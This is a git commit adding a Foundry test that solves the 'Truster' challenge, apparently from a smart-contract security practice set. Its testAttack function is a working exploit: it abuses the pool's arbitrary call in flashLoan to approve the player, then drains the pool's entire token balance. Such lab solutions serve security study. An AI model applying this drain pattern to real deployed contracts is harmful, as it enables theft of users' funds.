619a7ba416b1b18e2913b89746fd02dc82406e53
Djordje Zivkovic <djordje@zivkovic.me>
2023-04-09 11:55:32 +0200

    Added solution for Challenge #3 - Truster.

---
+++ test/truster/TrusterLenderPool.t.sol
@@ -0,0 +1,43 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+
+contract TrusterLenderPoolTest is Test {
+    TrusterLenderPool public pool;
+    DamnValuableToken public token;
+    address public player;
+    uint256 public constant POOL_INITIAL_BALANCE = 1_000_000e18;
+
+    function setUp() public {
+        token = new DamnValuableToken();
+        pool = new TrusterLenderPool(token);
+        player = makeAddr("player");
+        token.transfer(address(pool), POOL_INITIAL_BALANCE);
+
+        assertEq(token.balanceOf(address(pool)), POOL_INITIAL_BALANCE);
+        assertEq(token.balanceOf(address(player)), 0);
+    }
+
+    function testAttack() public {
+        // Exploit code:
+        pool.flashLoan(
+            0,
+            address(player),
+            address(token),
+            abi.encodeWithSelector(token.approve.selector, address(player), POOL_INITIAL_BALANCE)
+        );
+        vm.startPrank(player);
+        token.transferFrom(address(pool), address(player), POOL_INITIAL_BALANCE);
+        vm.stopPrank();
+        //
+        validate();
+    }
+
+    function validate() public {
+        assertEq(token.balanceOf(address(pool)), 0);
+        assertEq(token.balanceOf(address(player)), POOL_INITIAL_BALANCE);
+    }
+}
